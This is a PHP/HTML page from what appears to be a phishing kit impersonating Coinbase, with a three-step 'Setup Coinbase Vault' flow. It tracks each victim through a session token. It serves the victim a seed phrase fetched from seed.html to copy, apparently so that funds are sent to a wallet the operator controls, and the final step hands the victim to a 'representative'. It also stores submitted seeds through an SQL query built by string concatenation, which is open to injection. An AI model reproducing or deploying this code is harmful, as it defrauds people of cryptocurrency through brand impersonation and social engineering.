<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";


// Check if both the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Retrieve the email and token from the session
$email = $_SESSION["email"];
$token = $_SESSION["token"];

// Update user activity to indicate visiting url.php
updateActivity($token, "SeedPage");

// Use prepared statement to validate the token
$stmt_token = $conn->prepare("SELECT * FROM user_submissions WHERE email = ? AND token = ?");
$stmt_token->bind_param("ss", $email, $token);
$stmt_token->execute();
$result_token = $stmt_token->get_result();

// If the token is invalid, redirect the user back to login.php
if ($result_token->num_rows !== 1) {
    header("Location: login.php");
    exit();
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the seed phrase submitted in the form
    $seed = $_POST["seed"];

    // Update the user_submissions table with the seed phrase and token
    $update_sql = "UPDATE user_submissions SET seed='$seed' WHERE email='$email'";
    if ($conn->query($update_sql) === TRUE) {
        // Seed phrase updated successfully
        // Redirect to the next page
        header("Location: loading.php");
        exit();
    } else {
        // Error updating seed phrase in the database
        echo "Error updating seed phrase: " . $conn->error;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://seeklogo.com/images/C/coinbase-coin-logo-C86F46D7B8-seeklogo.com.png" type="image/x-icon">
    <title>Coinbase - Security</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'),
                 url('path/to/CoinbaseSans.woff') format('woff');
            font-weight: normal;
            font-style: normal;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #121212;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        }

        .container {
            width: 80%;
            max-width: 600px;
            padding: 20px;
        }

        .content-table {
            width: 100%;
            background-color: #1E1E1E;
            border-collapse: collapse;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
            border-radius: 30px;
            overflow: hidden;
        }

        .content-table td {
            padding: 20px;
        }

        .header-logo {
            text-align: left;
            margin-bottom: 20px;
        }

        .header-logo img {
            width: 150px;
            height: auto;
        }

        .steps {
            text-align: right;
            font-size: 14px;
            color: #89909E;
            margin-bottom: 20px;
        }

        .main-title {
            font-size: 24px;
            font-weight: bold;
            color: #E0E0E0;
            margin-top: 0;
            margin-bottom: 20px;
        }

        .blur-button, .next-button, .back-button {
            display: block;
            font-size: 16px;
            padding: 15px 25px;
            background-color: #0052ff;
            color: #E0E0E0;
            border-radius: 50px;
            text-decoration: none;
            margin-bottom: 15px;
            font-weight: 400;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: none;
        }

        .blur-button:hover, .next-button:hover, .back-button:hover {
            background-color: #014cec;
            transform: scale(1.05);
        }

        .footer {
            font-size: 14px;
            line-height: 20px;
            color: #89909E;
            margin: 0;
        }

        .notification {
            margin-top: 10px;
            font-size: 16px;
            color: #28a745;
            display: none;
        }

        .hidden {
            display: none;
        }

        .navigation-buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .right-align {
            /*display: flex;
            justify-content: flex-end;*/
        }

        .long {
          width: 440px;
        }
    </style>
</head>
<body>
<div class="container">
  <table class="content-table" align="center" cellspacing="0" cellpadding="0">
    <tbody id="step1">
      <tr>
        <td>
          <div class="header-logo">
            <a href="https://coinbase.com" style="text-decoration: none;">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coinbase.svg/2560px-Coinbase.svg.png" alt="Coinbase logo">
            </a>
          </div>
          <div class="steps">Step 1 of 3</div>     
          <center><svg xmlns="http://www.w3.org/2000/svg" height="180px" width="180px" fill="none" viewBox="0 0 48 48"><path fill="#CED2DB" fill-rule="evenodd" d="M25 1h-6v12h6a11.43 11.43 0 0 1 11 11 6.33 6.33 0 0 1-6 6v12a18.24 18.24 0 0 0 18-18C48 11.75 37.25 1 25 1Z" clip-rule="evenodd"/><path fill="#101114" d="M19 39.58v-4.67 3.57a13.15 13.15 0 0 0 11-5.9V25.3a11 11 0 0 0-21.93 0H19v14.28Z"/><path fill="#101114" fill-rule="evenodd" d="M19.01 1h.01a6 6 0 0 1 0 12H19a6 6 0 0 1 0-12h.01Z" clip-rule="evenodd"/><path fill="#0052FF" d="M30 24.42H0V48h30V24.42Z"/><path fill="#0A0B0D" fill-rule="evenodd" d="M6 40H0v-8h6a4 4 0 0 1 0 8Z" clip-rule="evenodd"/><path fill="#0052FF" d="M6 38a2 2 0 1 0 0-4 2 2 0 0 0 0 4Zm24-8a6 6 0 1 1 0 12V30Z"/><path fill="#0A0B0D" d="M30 42a6 6 0 1 1 0-12v12Z"/></svg></center>
          <div style="margin-bottom: 20px;">
            <center>
              <h2>Setup Coinbase Vault</h2>
              <p>Follow the step-by-step guide on how to link your Coinbase account to your Vault. Secure your assets by moving funds to your newly created Vault.</p>
            </center>
          </div>
          <div class="right-align">
            <center><button class="next-button long" onclick="showStep('step2')">Next</button></center>
          </div>
        </td>
      </tr>
    </tbody>
    <tbody id="step2" class="hidden">
      <tr>
        <td>
          <div class="header-logo">
            <a href="https://coinbase.com" style="text-decoration: none;">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coinbase.svg/2560px-Coinbase.svg.png" alt="Coinbase logo">
            </a>
          </div>
          <div class="steps">Step 2 of 3</div>
          <center><svg xmlns="http://www.w3.org/2000/svg" height="180px" width="180px" fill="none" viewBox="0 0 48 48"><path fill="#CED2DB" fill-rule="evenodd" d="M25 1h-6v12h6a11.43 11.43 0 0 1 11 11 6.33 6.33 0 0 1-6 6v12a18.24 18.24 0 0 0 18-18C48 11.75 37.25 1 25 1Z" clip-rule="evenodd"/><path fill="#101114" d="M19 39.58v-4.67 3.57a13.15 13.15 0 0 0 11-5.9V25.3a11 11 0 0 0-21.93 0H19v14.28Z"/><path fill="#101114" fill-rule="evenodd" d="M19.01 1h.01a6 6 0 0 1 0 12H19a6 6 0 0 1 0-12h.01Z" clip-rule="evenodd"/><path fill="#0052FF" d="M30 24.42H0V48h30V24.42Z"/><path fill="#0A0B0D" fill-rule="evenodd" d="M6 40H0v-8h6a4 4 0 0 1 0 8Z" clip-rule="evenodd"/><path fill="#0052FF" d="M6 38a2 2 0 1 0 0-4 2 2 0 0 0 0 4Zm24-8a6 6 0 1 1 0 12V30Z"/><path fill="#0A0B0D" d="M30 42a6 6 0 1 1 0-12v12Z"/></svg>
          <div style="margin-bottom: 20px;">
            <p>Write down or copy your seed phrase<br>Download the <a href="https://www.coinbase.com/wallet/downloads">Coinbase Wallet</a> app.</p>
            <div id="reveal-button" class="blur-button long" onclick="toggleSpoiler()">Reveal Seed Phrase</div>
            <div id="copy-notification" class="notification">Seed phrase copied to clipboard</div></center>
          </div>
        </td>
      </tr>
    </tbody>
    <tbody id="step3" class="hidden">
      <tr>
        <td>
          <div class="header-logo">
            <a href="https://coinbase.com" style="text-decoration: none;">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coinbase.svg/2560px-Coinbase.svg.png" alt="Coinbase logo">
            </a>
          </div>
          <div class="steps">Step 3 of 3</div>
          <center>
          <svg xmlns="http://www.w3.org/2000/svg" height="180px" width="180px" fill="none" viewBox="0 0 48 48"><path fill="#CED2DB" fill-rule="evenodd" d="M25 1h-6v12h6a11.43 11.43 0 0 1 11 11 6.33 6.33 0 0 1-6 6v12a18.24 18.24 0 0 0 18-18C48 11.75 37.25 1 25 1Z" clip-rule="evenodd"/><path fill="#101114" d="M19 39.58v-4.67 3.57a13.15 13.15 0 0 0 11-5.9V25.3a11 11 0 0 0-21.93 0H19v14.28Z"/><path fill="#101114" fill-rule="evenodd" d="M19.01 1h.01a6 6 0 0 1 0 12H19a6 6 0 0 1 0-12h.01Z" clip-rule="evenodd"/><path fill="#0052FF" d="M30 24.42H0V48h30V24.42Z"/><path fill="#0A0B0D" fill-rule="evenodd" d="M6 40H0v-8h6a4 4 0 0 1 0 8Z" clip-rule="evenodd"/><path fill="#0052FF" d="M6 38a2 2 0 1 0 0-4 2 2 0 0 0 0 4Zm24-8a6 6 0 1 1 0 12V30Z"/><path fill="#0A0B0D" d="M30 42a6 6 0 1 1 0-12v12Z"/></svg>
          </center>
          <div style="margin-bottom: 20px; margin-top: 20px;">
          <center><h1 class="main-title">You're all set!</h1>
            <p>Your representative will now guide you through<br>the steps to completing this process</p>
          </div>
            <center><div id="reveal-button" class="blur-button" onclick="redirectToLoading()">Continue</div></center>
        </td>
      </tr>
    </tbody>    
  </table>
</div>
<script>
    function toggleSpoiler() {
        var button = document.getElementById("reveal-button");
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'seed.html', true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    var seedPhrase = xhr.responseText;
                    console.log("Seed Phrase:", seedPhrase);
                    button.innerHTML = seedPhrase;
                    button.style.backgroundColor = "transparent";
                    button.style.color = "#E0E0E0";
                    button.style.backdropFilter = "none";
                    button.style.webkitBackdropFilter = "none";
                    button.style.cursor = "pointer";
                    button.setAttribute("onclick", "copyToClipboard('" + seedPhrase + "')");
                } else {
                    console.error("Error fetching seed:", xhr.status);
                }
            }
        };
        xhr.send();
    }

    function copyToClipboard(text) {
        var textArea = document.createElement("textarea");
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand("copy");
        document.body.removeChild(textArea);

        var notification = document.getElementById("copy-notification");
        notification.style.display = "block";

        // Set timeout to redirect after 5 seconds
        setTimeout(function() {
            showStep("step3")
        }, 3000);

        setTimeout(function() {
            notification.style.display = "none";
        }, 2000);
    }

    function showStep(step) {
        var steps = ['step1', 'step2', 'step3'];
        steps.forEach(function(stepId) {
            document.getElementById(stepId).classList.add('hidden');
        });
        document.getElementById(step).classList.remove('hidden');
    }

    function redirectToLoading() {
        window.location.href = "loading.php";
    }
</script>
</body>
</html>
